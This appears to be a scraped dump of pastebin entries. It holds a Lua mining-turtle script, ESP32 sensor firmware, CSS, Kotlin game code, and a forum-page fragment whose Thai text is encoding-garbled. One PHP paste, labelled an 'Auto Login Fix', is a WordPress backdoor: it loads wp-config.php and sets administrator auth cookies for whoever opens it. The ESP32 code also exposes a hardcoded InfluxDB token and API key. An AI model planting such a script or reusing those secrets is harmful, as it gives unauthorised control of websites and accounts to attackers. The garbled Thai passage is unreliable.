<p>‡∏Ñ‡∏§‡∏´‡∏≤‡∏™‡∏ô‡πå‡∏´‡∏•‡∏±‡∏á‡∏ô‡∏µ‡πâ‡∏ñ‡∏π‡∏Å‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏Ç‡∏∂‡πâ‡∏ô‡πÉ‡∏ô‡∏õ‡∏µ 1961 ‡∏°‡∏µ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏π‡∏á‡∏™‡∏≤‡∏°‡∏ä‡∏±‡πâ‡∏ô ‡∏ï‡∏±‡πâ‡∏á‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô‡∏¢‡πà‡∏≤‡∏ô‡∏ä‡∏∏‡∏°‡∏ä‡∏ô‡∏Å‡πà‡∏≠‡∏ô‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏ñ‡∏π‡∏Å‡∏ó‡∏¥‡πâ‡∏á‡∏£‡πâ‡∏≤‡∏á‡πÄ‡∏≠‡∏≤‡πÑ‡∏ß‡πâ‡∏à‡∏ô‡∏™‡∏≠‡∏á‡∏û‡∏µ‡πà‡∏ô‡πâ‡∏≠‡∏á‡∏ü‡∏•‡∏≠‡πÄ‡∏ã‡∏ô‡πÑ‡∏ó‡∏ô‡πå‡πÄ‡∏Ç‡πâ‡∏≤‡∏°‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡πÄ‡∏à‡πâ‡∏≤‡∏Ç‡∏≠‡∏á ‡πÄ‡∏î‡∏≠ ‡πÄ‡∏≠‡∏™‡πÄ‡∏°‡∏≠‡πÄ‡∏£‡∏¢‡πå ‡∏ñ‡∏π‡∏Å‡∏•‡πâ‡∏≠‡∏°‡∏£‡∏≠‡∏ö‡∏î‡πâ‡∏ß‡∏¢‡∏ó‡∏¥‡∏ß‡∏™‡∏ô‡πÅ‡∏ó‡∏ô‡∏£‡∏±‡πâ‡∏ß ‡∏î‡πâ‡∏≤‡∏ô‡∏´‡∏ô‡πâ‡∏≤‡∏ï‡∏±‡∏ß‡∏Ñ‡∏§‡∏´‡∏≤‡∏™‡∏ô‡πå‡∏°‡∏µ‡∏™‡∏ß‡∏ô‡∏î‡∏≠‡∏Å‡πÑ‡∏°‡πâ‡∏ó‡∏µ‡πà‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏£‡∏¢‡∏≤‡∏Å‡∏≤‡∏®‡∏™‡∏î‡πÉ‡∏™ ‡∏≠‡∏ö‡∏≠‡∏∏‡πà‡∏ô ‡∏î‡πâ‡∏≤‡∏ô‡∏Ç‡πâ‡∏≤‡∏á‡∏¢‡∏±‡∏á‡∏°‡∏µ‡∏®‡∏≤‡∏•‡∏≤‡∏´‡∏•‡∏±‡∏á‡πÄ‡∏•‡πá‡∏Å‡πÑ‡∏ß‡πâ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏à‡∏¥‡∏ö‡∏ô‡πâ‡∏≥‡∏ä‡∏≤‡∏≠‡∏µ‡∏Å‡∏î‡πâ‡∏ß‡∏¢ ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÑ‡∏´‡∏£‡πà‡∏ó‡∏µ‡πà‡∏°‡∏µ‡∏•‡∏°‡∏û‡∏±‡∏î‡∏Å‡∏•‡∏µ‡∏ö‡∏î‡∏≠‡∏Å‡πÑ‡∏°‡πâ‡∏à‡∏∞‡∏£‡πà‡∏ß‡∏á‡∏•‡∏á‡∏°‡∏≤‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡∏°‡∏µ‡∏ó‡∏¥‡∏ß‡∏ó‡∏±‡∏®‡∏ô‡πå‡∏ó‡∏µ‡πà‡∏™‡∏ß‡∏¢‡∏á‡∏≤‡∏°‡πÄ‡∏õ‡πá‡∏ô‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏°‡∏≤‡∏Å ‡∏ß‡πà‡∏≤‡∏Å‡∏±‡∏ô‡∏ß‡πà‡∏≤‡∏Ç‡πâ‡∏≤‡∏á‡πÉ‡∏ô‡∏Ñ‡∏§‡∏´‡∏≤‡∏™‡∏ô‡πå‡∏´‡∏•‡∏±‡∏á‡∏ô‡∏µ‡πâ‡∏ô‡∏±‡πâ‡∏ô ‡πÄ‡∏ï‡πá‡∏°‡πÑ‡∏õ‡∏î‡πâ‡∏ß‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏•‡∏±‡∏ö‡∏°‡∏≤‡∏Å‡∏°‡∏≤‡∏¢‡∏ó‡∏µ‡πà‡πÅ‡∏™‡∏ô‡∏•‡∏∂‡∏Å‡∏•‡∏±‡∏ö‡πÅ‡∏•‡∏∞‡πÄ‡∏´‡∏ô‡∏∑‡∏≠‡∏à‡∏¥‡∏ô‡∏ï‡∏ô‡∏≤‡∏Å‡∏≤‡∏£ ‡πÅ‡∏ï‡πà‡∏ö‡πâ‡∏≤‡∏á‡∏Å‡πá‡∏ß‡πà‡∏≤‡πÅ‡∏°‡πà‡∏°‡∏î‡∏à‡∏≤‡∏Å‡∏ï‡∏£‡∏∞‡∏Å‡∏π‡∏•‡∏ü‡∏•‡∏≠‡πÄ‡∏ã‡∏ô‡πÑ‡∏ó‡∏ô‡πå‡∏ó‡∏±‡πâ‡∏á‡∏™‡∏≠‡∏á‡πÉ‡∏ä‡πâ‡∏ó‡∏≥‡∏™‡∏¥‡πà‡∏á‡∏•‡∏∂‡∏Å‡∏•‡∏±‡∏ö‡∏ö‡∏≤‡∏á‡∏™‡∏¥‡πà‡∏á‡∏ö‡∏≤‡∏á‡∏≠‡∏¢‡πà‡∏≤‡∏á</p></div>
<div class=""esmeray-member-flex"">
<a href=""https://roleplayth.com/member.php?action=profile&uid=261"" class=""esmeray-member-side"" style=""--esmeray-pic: url(https://i.imgur.com/QSVp3bF.png);""><div class=""esmeray-member-name"">Letisia</div></a>
<a href=""https://roleplayth.com/member.php?action=profile&uid=5"" class=""esmeray-member-center"" style=""--esmeray-pic: url(https://i.imgur.com/L9oGpCW.png);""><div class=""esmeray-member-name"">Louisa</div></a>
<a href=""https://roleplayth.com/member.php?action=profile&uid=37"" class=""esmeray-member-side"" style=""--esmeray-pic: url(https://i.imgur.com/qYQfhKD.png);""><div class=""esmeray-member-name"">Bethany</div></a>
</div>
<br><br><br><div class=""esmeray-bottom""></div>
</div></div></div>
[dh=display: none;][ytauto=rxBwgwDplpI][/ytauto][/dh]"
0jTweMni,SomeStinkyStaircase,lambda-y,Lua,Tuesday 25th of June 2024 10:17:42 PM CDT,"local targetDepth = -50
io.write('Enter Y Level')
local currentDepth = read() + 0

-- Function to check if the turtle needs to refuel
function needsRefuel()
  local fuelLevel = turtle.getFuelLevel()
  if fuelLevel ~= ""unlimited"" then
    if turtle.getFuelLevel() < currentDepth + 3 then
      return true
    end
  end
  return false
end

-- Function to refuel the turtle
local function refuel()
    turtle.select(1)
    if turtle.getFuelLevel() < 10 and turtle.getItemCount(1) > 0 then
        -- Check for fuel in inventory (assuming slot 1)
        if turtle.getItemCount(1) > 0 then
            turtle.refuel(5)
        end
    end
end

-- Main loop for digging
while currentDepth > targetDepth do

  -- Check for fuel and refuel if needed
  if needsRefuel() then
    refuel()
    if not turtle.getFuelLevel() then
      io.write(""Out of fuel! Stopping..."")
      break
    end
  end

  -- Mine forward one block
  turtle.dig()
  turtle.forward()
  turtle.digUp()
  turtle.turnLeft()
  turtle.dig()
  turtle.turnRight()
  turtle.turnRight()
  turtle.dig()
  turtle.turnLeft()

  -- Move down one level and update depth
  if currentDepth > targetDepth then
    turtle.digDown()
    turtle.down()
    currentDepth = currentDepth - 1
  end

  

  -- Mine a block down and collect items
  
end

io.write(""Reached target depth: "" .. targetDepth)
"
cD5yKZNf,Wordpress Panel Auto Login Fix,willysec_id,PHP,Tuesday 25th of June 2024 10:08:36 PM CDT,"<?php
//26 June 2024 - @willygoid
$path = __DIR__;
while ($path && !file_exists($path . '/wp-config.php')) {
    $parent_path = dirname($path);
    if ($parent_path === $path) break;
    $path = $parent_path;
}

if ($path && file_exists($path . '/wp-config.php')) {
    include($path . '/wp-config.php');
    wp_clear_auth_cookie();
    wp_set_current_user(1);
    wp_set_auth_cookie(1);
    wp_safe_redirect(admin_url());
} else {
    echo 'wp-config.php file not found';
}"
z1Bay1tV,Perbaikan Tugas Akhir - ESP32 Publisher - MySQL,mudhita_triari,C++,Tuesday 25th of June 2024 09:44:56 PM CDT,"#include <Arduino.h>
#include <WiFi.h>
#include <WiFiMulti.h>
#include <WiFiManager.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <otadrive_esp.h>

WiFiManager wm;

// Server details
const char* serverName = ""https://bootcampindobot.com/index_mudhita1.php"";
const char* apiKeyValue = ""tPmAT5Ab3j7F9"";

// UART communication settings
const int SERIAL_BAUD_RATE = 115200;
const int SERIAL_RX_PIN = 16;
const int SERIAL_TX_PIN = 17;

// WiFiMulti instance
WiFiMulti wifiMulti;

// HardwareSerial instance for UART2
HardwareSerial SerialESP32_7(2);

String FW_VERSION = ""1.0.4"";

unsigned long previousSyncMillis = 0;
const long syncInterval = 60000; // Sync every 60 seconds

// LED pin
const int LED_PIN = 2; // Ganti dengan pin yang sesuai untuk LED

// Function prototypes
void saveWifiCallback();
void configModeCallback(WiFiManager *myWiFiManager);
void onUpdateProgress(int progress, int total);
void sync_task();
void sendDataOverUART(const char* chipId, const char* tempOffset, const char* humOffset, const char* ppmOffset,
                      const char* luxOffset, const char* longitude, const char* latitude, const char* elevation);
void sendHttpPost(const char* id, float hum, float temp, float ppm, float lux, float longitude, float latitude, float elevation);
void printAligned(const char* label, const char* value);
void logData(const char* label, float value, int decimalPlaces = 2);
void logData(const char* label, const char* value);
void blinkLED(int times, int duration);

void setup() {
    // Inisialisasi pin LED
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, LOW);

    Serial.begin(SERIAL_BAUD_RATE);
    Serial.println(""Starting setup..."");

    // Inisialisasi UART pada pin RX dan TX yang ditentukan
    SerialESP32_7.begin(SERIAL_BAUD_RATE, SERIAL_8N1, SERIAL_RX_PIN, SERIAL_TX_PIN);

    // Enable debug output untuk WiFiManager
    wm.setDebugOutput(true);

    // Tambahkan parameter custom untuk WiFiManager
    WiFiManagerParameter custom_id(""id"", ""Device ID"", """", 32);
    WiFiManagerParameter custom_hum(""hum"", ""Humidity"", """", 5);
    WiFiManagerParameter custom_temp(""temp"", ""Temperature"", """", 5);
    WiFiManagerParameter custom_ppm(""ppm"", ""PPM"", """", 5);
    WiFiManagerParameter custom_lux(""lux"", ""Lux"", """", 5);
    WiFiManagerParameter custom_longitude(""longitude"", ""Longitude"", """", 12);
    WiFiManagerParameter custom_latitude(""latitude"", ""Latitude"", """", 12);
    WiFiManagerParameter custom_elevation(""elevation"", ""Elevation"", """", 5);

    // Tambahkan parameter ke WiFiManager
    wm.addParameter(&custom_id);
    wm.addParameter(&custom_hum);
    wm.addParameter(&custom_temp);
    wm.addParameter(&custom_ppm);
    wm.addParameter(&custom_lux);
    wm.addParameter(&custom_longitude);
    wm.addParameter(&custom_latitude);
    wm.addParameter(&custom_elevation);

    // Set callback untuk WiFiManager
    wm.setAPCallback(configModeCallback);
    wm.setSaveConfigCallback(saveWifiCallback);

    // Mulai konfigurasi WiFiManager portal
    if (!wm.autoConnect(""ENVIRO OBSERVER DIAGNOSIS"", ""password"")) {
        Serial.println(""Failed to connect to WiFi and timeout"");
        delay(3000);
        ESP.restart();
    }

    Serial.println(""Connected to WiFi"");

    // Kirim data melalui UART setelah terhubung
    sendDataOverUART(custom_id.getValue(), custom_hum.getValue(), custom_temp.getValue(), custom_ppm.getValue(),
                     custom_lux.getValue(), custom_longitude.getValue(), custom_latitude.getValue(),
                     custom_elevation.getValue());

    // Periksa nilai parameter yang disimpan
    Serial.println(""\n-----------------KALIBRASI NODEMESH-----------------\n"");
    printAligned(""Device ID:"", custom_id.getValue());
    printAligned(""Humidity:"", custom_hum.getValue());
    printAligned(""Temperature:"", custom_temp.getValue());
    printAligned(""PPM:"", custom_ppm.getValue());
    printAligned(""Lux:"", custom_lux.getValue());

    Serial.println(""\n------------------LOKASI NODEMESH------------------\n"");
    printAligned(""Longitude:"", custom_longitude.getValue());
    printAligned(""Latitude:"", custom_latitude.getValue());
    printAligned(""Elevation:"", custom_elevation.getValue());

    Serial.println(""Setup complete."");
}

void loop() {
    if (SerialESP32_7.available()) {
        blinkLED(3, 100); // LED berkedip 3 kali saat data diterima
        String serialMsg = SerialESP32_7.readStringUntil('\n');
        serialMsg.trim();

        Serial.println(""Diterima dari Pusat Data: "" + serialMsg);

        if (serialMsg.length() > 0) {
            DynamicJsonDocument doc(256);
            DeserializationError error = deserializeJson(doc, serialMsg);

            if (error) {
                Serial.print(""deserializeJson() gagal: "");
                Serial.println(error.c_str());
            } else {
                const char* id = doc[""id""];
                if (!id) {
                    Serial.println(""JSON tidak valid: 'id' tidak ditemukan"");
                } else {
                    if (doc.containsKey(""hum"") && doc.containsKey(""temp"") && doc.containsKey(""ppm"") && doc.containsKey(""lux"") &&
                        doc.containsKey(""longitude"") && doc.containsKey(""latitude"") && doc.containsKey(""elevation"")) {
                        float hum = doc[""hum""];
                        float temp = doc[""temp""];
                        float ppm = doc[""ppm""];
                        float lux = doc[""lux""];
                        float longitude = doc[""longitude""].as<float>();
                        float latitude = doc[""latitude""].as<float>();
                        float elevation = doc[""elevation""];

                        // Log data received from UART
                        Serial.println(""\nData diterima dari UART:"");
                        logData(""ID:"", id);
                        logData(""Kelembaban:"", hum);
                        logData(""Suhu:"", temp);
                        logData(""PPM:"", ppm);
                        logData(""Lux:"", lux);
                        logData(""Longitude:"", longitude, 4);
                        logData(""Latitude:"", latitude, 4);
                        logData(""Elevasi:"", elevation);

                        // Send data to the server
                        sendHttpPost(id, hum, temp, ppm, lux, longitude, latitude, elevation);

                        Serial.println(""\nMengirim data berikut ke server:"");
                        logData(""ID:"", id);
                        logData(""UNIT:"", id);
                        logData(""Kelembaban:"", hum);
                        logData(""Suhu:"", temp);
                        logData(""PPM:"", ppm);
                        logData(""Lux:"", lux);
                        logData(""Longitude:"", longitude, 4);
                        logData(""Latitude:"", latitude, 4);
                        logData(""Elevasi:"", elevation);
                    } else {
                        Serial.println(""JSON tidak valid: beberapa kunci data tidak ditemukan"");
                    }
                }
            }
        }
    }
    sync_task();
}

void sync_task() {
    unsigned long currentMillis = millis();
    if (currentMillis - previousSyncMillis >= syncInterval) {
        previousSyncMillis = currentMillis;

        if (WiFi.status() != WL_CONNECTED) {
            Serial.println(""WiFi tidak terhubung! Mencoba menghubungkan kembali..."");
            WiFi.reconnect();
            return;
        }

        Serial.println(""Firmware version: "" + FW_VERSION);
        OTADRIVE.updateFirmware();
    }
}

void sendDataOverUART(const char* chipId, const char* tempOffset, const char* humOffset, const char* ppmOffset,
                      const char* luxOffset, const char* longitude, const char* latitude, const char* elevation) {
    StaticJsonDocument<200> jsonDocument;

    jsonDocument[""chipId""] = chipId;
    jsonDocument[""tempOffset""] = tempOffset;
    jsonDocument[""humOffset""] = humOffset;
    jsonDocument[""ppmOffset""] = ppmOffset;
    jsonDocument[""luxOffset""] = luxOffset;
    jsonDocument[""longitude""] = longitude;
    jsonDocument[""latitude""] = latitude;
    jsonDocument[""elevation""] = elevation;

    String jsonString;
    serializeJson(jsonDocument, jsonString);

    SerialESP32_7.println(jsonString);
}

void sendHttpPost(const char* id, float hum, float temp, float ppm, float lux, float longitude, float latitude, float elevation) {
    if (WiFi.status() == WL_CONNECTED) {
        blinkLED(2, 100); // LED berkedip 2 kali saat data dikirim
        HTTPClient http;
        http.begin(serverName);

        http.addHeader(""Content-Type"", ""application/x-www-form-urlencoded"");

        String httpRequestData = ""api_key="" + String(apiKeyValue) + ""&id="" + String(id) + ""&hum="" + String(hum) +
                                 ""&temp="" + String(temp) + ""&ppm="" + String(ppm) + ""&lux="" + String(lux) +
                                 ""&longitude="" + String(longitude, 4) + ""&latitude="" + String(latitude, 4) +
                                 ""&elevation="" + String(elevation);

        int httpResponseCode = http.POST(httpRequestData);

        Serial.print(""HTTP Response code: "");
        Serial.println(httpResponseCode);

        if (httpResponseCode > 0) {
            String response = http.getString();
            Serial.println(""Response: "" + response);
        } else {
            Serial.print(""Error code: "");
            Serial.println(httpResponseCode);
        }

        http.end();
    } else {
        Serial.println(""WiFi tidak terhubung"");
    }
}

void printAligned(const char* label, const char* value) {
    Serial.print(label);
    int len = 30 - strlen(label);
    for (int i = 0; i < len; i++) {
        Serial.print("" "");
    }
    Serial.println(value);
}

void logData(const char* label, float value, int decimalPlaces) {
    Serial.print(label);
    Serial.println(value, decimalPlaces);
}

void logData(const char* label, const char* value) {
    Serial.print(label);
    Serial.println(value);
}

void blinkLED(int times, int duration) {
    for (int i = 0; i < times; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(duration);
        digitalWrite(LED_PIN, LOW);
        delay(duration);
    }
}

void saveWifiCallback() {
    Serial.println(""Settings have been saved"");
}

void configModeCallback(WiFiManager *myWiFiManager) {
    Serial.println(""Entered configuration mode"");
    Serial.println(WiFi.softAPIP());
    Serial.println(myWiFiManager->getConfigPortalSSID());
}

void onUpdateProgress(int progress, int total) {
    Serial.printf(""Update progress: %d of %d bytes...\n"", progress, total);
}"
0ZeHbE6P,Perbaikan Tugas Akhir - ESP32 Publisher - Influxdb,mudhita_triari,C++,Tuesday 25th of June 2024 09:42:06 PM CDT,"#include <Arduino.h>
#include <WiFi.h>
#include <WiFiMulti.h>
#include <WiFiManager.h>
#include <InfluxDbClient.h>
#include <InfluxDbCloud.h>
#include <ArduinoJson.h>
#include <otadrive_esp.h>

WiFiManager wm;

// WiFi and InfluxDB credentials
char ssid[32];
char password[32];

const char* INFLUXDB_URL =      ""https://us-east-1-1.aws.cloud2.influxdata.com"";
const char* INFLUXDB_TOKEN =    ""bY5Y8WsUTkW4aPPhvbrx6XWXi-s_-Da8JA3sN14ti2_QdzyCKBkoht93Ms_aoiYlZNuwGa2OmGwSuAPiwVJoYQ=="";
const char* INFLUXDB_ORG =      ""023982a3a96b797a"";
const char* INFLUXDB_BUCKET =   ""INDOBOT_FSID"";
const char* TZ_INFO =           ""UTC7"";

// UART communication settings
const int SERIAL_BAUD_RATE = 115200;
const int SERIAL_RX_PIN = 16;
const int SERIAL_TX_PIN = 17;

// WiFiMulti instance
WiFiMulti wifiMulti;

// HardwareSerial instance for UART2
HardwareSerial SerialESP32_7(2);

// InfluxDB client instance
InfluxDBClient influxClient(INFLUXDB_URL, INFLUXDB_ORG, INFLUXDB_BUCKET, INFLUXDB_TOKEN, InfluxDbCloud2CACert);

// Data point for InfluxDB
Point sensor(""sensor_data"");

String FW_VERSION = ""1.0.4"";

unsigned long previousSyncMillis = 0;
const long syncInterval = 60000; // Sync every 60 seconds

// LED pin
const int LED_PIN = 2; // Ganti dengan pin yang sesuai untuk LED

// Function prototypes
void saveWifiCallback();
void configModeCallback(WiFiManager *myWiFiManager);
void onUpdateProgress(int progress, int total);
void sync_task();
void sendDataOverUART(const char* chipId, const char* tempOffset, const char* humOffset, const char* ppmOffset,
                      const char* luxOffset, const char* longitude, const char* latitude, const char* elevation);
void printAligned(const char* label, const char* value);
void logData(const char* label, float value, int decimalPlaces = 2);
void logData(const char* label, const char* value);
void blinkLED(int times, int duration);

void setup() {
    // Inisialisasi pin LED
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, LOW);

    Serial.begin(SERIAL_BAUD_RATE);
    Serial.println(""Starting setup..."");

    // Initialize UART on specified RX and TX pins
    SerialESP32_7.begin(SERIAL_BAUD_RATE, SERIAL_8N1, SERIAL_RX_PIN, SERIAL_TX_PIN);

    // Enable debug output for WiFiManager
    wm.setDebugOutput(true);

    // Tambahkan parameter custom untuk WiFiManager
    WiFiManagerParameter custom_id(""id"", ""Device ID"", """", 32);
    WiFiManagerParameter custom_hum(""hum"", ""Humidity"", """", 5);
    WiFiManagerParameter custom_temp(""temp"", ""Temperature"", """", 5);
    WiFiManagerParameter custom_ppm(""ppm"", ""PPM"", """", 5);
    WiFiManagerParameter custom_lux(""lux"", ""Lux"", """", 5);
    WiFiManagerParameter custom_longitude(""longitude"", ""Longitude"", """", 12);
    WiFiManagerParameter custom_latitude(""latitude"", ""Latitude"", """", 12);
    WiFiManagerParameter custom_elevation(""elevation"", ""Elevation"", """", 5);

    // Tambahkan parameter ke WiFiManager
    wm.addParameter(&custom_id);
    wm.addParameter(&custom_hum);
    wm.addParameter(&custom_temp);
    wm.addParameter(&custom_ppm);
    wm.addParameter(&custom_lux);
    wm.addParameter(&custom_longitude);
    wm.addParameter(&custom_latitude);
    wm.addParameter(&custom_elevation);

    // Set WiFiManager callbacks
    wm.setAPCallback(configModeCallback);
    wm.setSaveConfigCallback(saveWifiCallback);

    // Mulai konfigurasi WiFiManager portal
    if (!wm.autoConnect(""ENVIRO OBSERVER DIAGNOSIS"", ""password"")) {
        Serial.println(""Failed to connect to WiFi and timeout"");
        delay(3000);
        ESP.restart();
    }

    Serial.println(""Connected to WiFi"");

    // Kirim data melalui UART setelah terhubung
    sendDataOverUART(custom_id.getValue(), custom_hum.getValue(), custom_temp.getValue(), custom_ppm.getValue(),
                     custom_lux.getValue(), custom_longitude.getValue(), custom_latitude.getValue(),
                     custom_elevation.getValue());

    // Periksa nilai parameter yang disimpan
    Serial.println(""\n-----------------KALIBRASI NODEMESH-----------------\n"");
    printAligned(""Device ID:"", custom_id.getValue());
    printAligned(""Humidity:"", custom_hum.getValue());
    printAligned(""Temperature:"", custom_temp.getValue());
    printAligned(""PPM:"", custom_ppm.getValue());
    printAligned(""Lux:"", custom_lux.getValue());

    Serial.println(""\n------------------LOKASI NODEMESH------------------\n"");
    printAligned(""Longitude:"", custom_longitude.getValue());
    printAligned(""Latitude:"", custom_latitude.getValue());
    printAligned(""Elevation:"", custom_elevation.getValue());

    Serial.println(""Setup complete."");
}

void loop() {
    if (SerialESP32_7.available()) {
        blinkLED(3, 100); // LED berkedip 3 kali saat data diterima
        String serialMsg = SerialESP32_7.readStringUntil('\n');
        serialMsg.trim();

        Serial.println(""Diterima dari Pusat Data: "" + serialMsg);

        if (serialMsg.length() > 0) {
            DynamicJsonDocument doc(256);
            DeserializationError error = deserializeJson(doc, serialMsg);

            if (error) {
                Serial.print(""deserializeJson() gagal: "");
                Serial.println(error.c_str());
            } else {
                const char* id = doc[""id""];
                if (!id) {
                    Serial.println(""JSON tidak valid: 'id' tidak ditemukan"");
                } else {
                    if (doc.containsKey(""hum"") && doc.containsKey(""temp"") && doc.containsKey(""ppm"") && doc.containsKey(""lux"") &&
                        doc.containsKey(""longitude"") && doc.containsKey(""latitude"") && doc.containsKey(""elevation"")) {
                        float hum = doc[""hum""];
                        float temp = doc[""temp""];
                        float ppm = doc[""ppm""];
                        float lux = doc[""lux""];
                        float longitude = doc[""longitude""].as<float>();
                        float latitude = doc[""latitude""].as<float>();
                        float elevation = doc[""elevation""];

                        // Log data received from UART
                        Serial.println(""\nData diterima dari UART:"");
                        logData(""ID:"", id);
                        logData(""Kelembaban:"", hum);
                        logData(""Suhu:"", temp);
                        logData(""PPM:"", ppm);
                        logData(""Lux:"", lux);
                        logData(""Longitude:"", longitude, 4); 
                        logData(""Latitude:"", latitude, 4);   
                        logData(""Elevasi:"", elevation);

                        sensor.clearFields();
                        sensor.clearTags();
                        sensor.addTag(""id"", id);
                        sensor.addField(""hum"", hum);
                        sensor.addField(""temp"", temp);
                        sensor.addField(""ppm"", ppm);
                        sensor.addField(""lux"", lux);
                        sensor.addField(""longitude"", longitude, 4);
                        sensor.addField(""latitude"", latitude, 4);
                        sensor.addField(""elevation"", elevation);

                        Serial.println(""\nMengirim data berikut ke InfluxDB:"");
                        logData(""ID:"", id);
                        logData(""Kelembaban:"", hum);
                        logData(""Suhu:"", temp);
                        logData(""PPM:"", ppm);
                        logData(""Lux:"", lux);
                        logData(""Longitude:"", longitude, 4);
                        logData(""Latitude:"", latitude, 4);
                        logData(""Elevasi:"", elevation);

                        if (!influxClient.writePoint(sensor)) {
                            Serial.print(""InfluxDB.write gagal: "");
                            Serial.println(influxClient.getLastErrorMessage());
                        }
                    } else {
                        Serial.println(""JSON tidak valid: beberapa kunci data tidak ditemukan"");
                    }
                }
            }
        }
    }
    sync_task();
}

void sync_task() {
    unsigned long currentMillis = millis();
    if (currentMillis - previousSyncMillis >= syncInterval) {
        previousSyncMillis = currentMillis;

        if (WiFi.status() != WL_CONNECTED) {
            Serial.println(""WiFi tidak terhubung! Mencoba menghubungkan kembali..."");
            WiFi.reconnect();
            return;
        }

        Serial.println(""Firmware version: "" + FW_VERSION);
        OTADRIVE.updateFirmware();
    }
}

void sendDataOverUART(const char* chipId, const char* tempOffset, const char* humOffset, const char* ppmOffset,
                      const char* luxOffset, const char* longitude, const char* latitude, const char* elevation) {
    StaticJsonDocument<200> jsonDocument;

    jsonDocument[""chipId""] = chipId;
    jsonDocument[""tempOffset""] = tempOffset;
    jsonDocument[""humOffset""] = humOffset;
    jsonDocument[""ppmOffset""] = ppmOffset;
    jsonDocument[""luxOffset""] = luxOffset;
    jsonDocument[""longitude""] = longitude;
    jsonDocument[""latitude""] = latitude;
    jsonDocument[""elevation""] = elevation;

    String jsonString;
    serializeJson(jsonDocument, jsonString);

    SerialESP32_7.println(jsonString);
}

void printAligned(const char* label, const char* value) {
    Serial.print(label);
    int len = 30 - strlen(label);
    for (int i = 0; i < len; i++) {
        Serial.print("" "");
    }
    Serial.println(value);
}

void logData(const char* label, float value, int decimalPlaces) {
    Serial.print(label);
    Serial.println(value, decimalPlaces);
}

void logData(const char* label, const char* value) {
    Serial.print(label);
    Serial.println(value);
}

void blinkLED(int times, int duration) {
    for (int i = 0; i < times; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(duration);
        digitalWrite(LED_PIN, LOW);
        delay(duration);
    }
}

void saveWifiCallback() {
    Serial.println(""Settings have been saved"");
}

void configModeCallback(WiFiManager *myWiFiManager) {
    Serial.println(""Entered configuration mode"");
    Serial.println(WiFi.softAPIP());
    Serial.println(myWiFiManager->getConfigPortalSSID());
}

void onUpdateProgress(int progress, int total) {
    Serial.printf(""Update progress: %d of %d bytes...\n"", progress, total);
}
"
Awyxjub6,JKIT || Set Height for Video in JKit - Video Button widget,fauzanjeg,CSS,Tuesday 25th of June 2024 09:37:17 PM CDT,"/* Set Height for Video in JKit - Video Button widget */
.jkit-swal-container.jkit-video-button-popup-container .jkit-swal-htmlContainer {
    height: 800px;
}
"
mdmxpPDN,UIgame,Samuel_Berkat_Hulu,Java,Tuesday 25th of June 2024 09:33:37 PM CDT,"package com.example.scramble_word.ui.theme

/**
 * Data class that represents the game UI state
 */
data class GameUiState(
    val currentScrambledWord: String = """",
    val currentWordCount: Int = 1,
    val score: Int = 0,
    val isGuessedWordWrong: Boolean = false,
    val isGameOver: Boolean = false
)"
tBjEuNUX,ViewModel,Samuel_Berkat_Hulu,Java,Tuesday 25th of June 2024 09:32:51 PM CDT,"package com.example.scramble_word.ui.theme

import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.ViewModel
import com.example.scramble_word.data.MAX_NO_OF_WORDS
import com.example.scramble_word.data.SCORE_INCREASE
import com.example.scramble_word.data.allWords
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update

class GameViewModel : ViewModel() {

    // Game UI state
    private val _uiState = MutableStateFlow(GameUiState())
    val uiState: StateFlow<GameUiState> = _uiState.asStateFlow()

    var userGuess by mutableStateOf("""")
        private set

    // Set of words used in the game
    private var usedWords: MutableSet<String> = mutableSetOf()
    private lateinit var currentWord: String

    init {
        resetGame()
    }

    /*
     * Re-initializes the game data to restart the game.
     */
    fun resetGame() {
        usedWords.clear()
        _uiState.value = GameUiState(currentScrambledWord = pickRandomWordAndShuffle())
    }

    /*
     * Update the user's guess
     */
    fun updateUserGuess(guessedWord: String){
        userGuess = guessedWord
    }

    /*
     * Checks if the user's guess is correct.
     * Increases the score accordingly.
     */
    fun checkUserGuess() {
        if (userGuess.equals(currentWord, ignoreCase = true)) {
            // User's guess is correct, increase the score
            // and call updateGameState() to prepare the game for next round
            val updatedScore = _uiState.value.score.plus(SCORE_INCREASE)
            updateGameState(updatedScore)
        } else {
            // User's guess is wrong, show an error
            _uiState.update { currentState ->
                currentState.copy(isGuessedWordWrong = true)
            }
        }
        // Reset user guess
        updateUserGuess("""")
    }

    /*
     * Skip to next word
     */
    fun skipWord() {
        updateGameState(_uiState.value.score)
        // Reset user guess
        updateUserGuess("""")
    }

    /*
     * Picks a new currentWord and currentScrambledWord and updates UiState according to
     * current game state.
     */
    private fun updateGameState(updatedScore: Int) {
        if (usedWords.size == MAX_NO_OF_WORDS){
            //Last round in the game, update isGameOver to true, don't pick a new word
            _uiState.update { currentState ->
                currentState.copy(
                    isGuessedWordWrong = false,
                    score = updatedScore,
                    isGameOver = true
                )
            }
        } else{
            // Normal round in the game
            _uiState.update { currentState ->
                currentState.copy(
                    isGuessedWordWrong = false,
                    currentScrambledWord = pickRandomWordAndShuffle(),
                    currentWordCount = currentState.currentWordCount.inc(),
                    score = updatedScore
                )
            }
        }
    }

    private fun shuffleCurrentWord(word: String): String {
        val tempWord = word.toCharArray()
        // Scramble the word
        tempWord.shuffle()
        while (String(tempWord) == word) {
            tempWord.shuffle()
        }
        return String(tempWord)
    }

    private fun pickRandomWordAndShuffle(): String {
        // Continue picking up a new random word until you get one that hasn't been used before
        currentWord = allWords.random()
        return if (usedWords.contains(currentWord)) {
            pickRandomWordAndShuffle()
        } else {
            usedWords.add(currentWord)
